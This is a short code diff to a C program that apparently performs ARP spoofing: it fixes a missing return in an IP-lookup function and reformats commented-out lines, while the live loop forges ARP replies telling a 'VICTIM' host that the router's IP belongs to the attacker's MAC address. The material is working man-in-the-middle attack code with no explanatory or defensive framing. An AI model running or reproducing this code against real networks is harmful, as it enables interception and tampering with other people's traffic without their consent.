@@ -131,9 +131,10 @@ char* get_ip_addr(int socket, char *interface) {
 	}
 
 	strcpy(src_ip, inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
-
 	
 	submit_log("IP ADDR: %s\n", src_ip);
+
+	return src_ip;
 }
 
 int main(int argc, char **argv) {
@@ -214,13 +215,13 @@ int main(int argc, char **argv) {
 	
 
 	while (TRUE) {
-		//ethernet = create_eth_header(ROUTER_MAC_ADDR, VICTIM_MAC_ADDR, ETHERTYPE_ARP);
-		//arp = create_arp_header(MY_MAC_ADDR, ROUTER_IP_ADDR, BROADCAST_MAC_ADDR, VICTIM_IP_ADDR, ARP_REQUEST);
-		//send_packet(ethernet, arp, interface);
+		// ethernet = create_eth_header(ROUTER_MAC_ADDR, VICTIM_MAC_ADDR, ETHERTYPE_ARP);
+		// arp = create_arp_header(MY_MAC_ADDR, ROUTER_IP_ADDR, BROADCAST_MAC_ADDR, VICTIM_IP_ADDR, ARP_REQUEST);
+		// send_packet(ethernet, arp, interface);
 
-		//ethernet = create_eth_header(VICTIM_MAC_ADDR, ROUTER_MAC_ADDR, ETHERTYPE_ARP);
-		//arp = create_arp_header(MY_MAC_ADDR, VICTIM_IP_ADDR, BROADCAST_MAC_ADDR, ROUTER_IP_ADDR, ARP_REQUEST);
-		//send_packet(ethernet, arp, interface);
+		// ethernet = create_eth_header(VICTIM_MAC_ADDR, ROUTER_MAC_ADDR, ETHERTYPE_ARP);
+		// arp = create_arp_header(MY_MAC_ADDR, VICTIM_IP_ADDR, BROADCAST_MAC_ADDR, ROUTER_IP_ADDR, ARP_REQUEST);
+		// send_packet(ethernet, arp, interface);
 
 		ethernet 	= create_eth_header(MY_MAC_ADDR, VICTIM_MAC_ADDR, ETHERTYPE_ARP);
 		arp 		= create_arp_header(MY_MAC_ADDR, ROUTER_IP_ADDR, VICTIM_MAC_ADDR, VICTIM_IP_ADDR, ARP_REPLY);
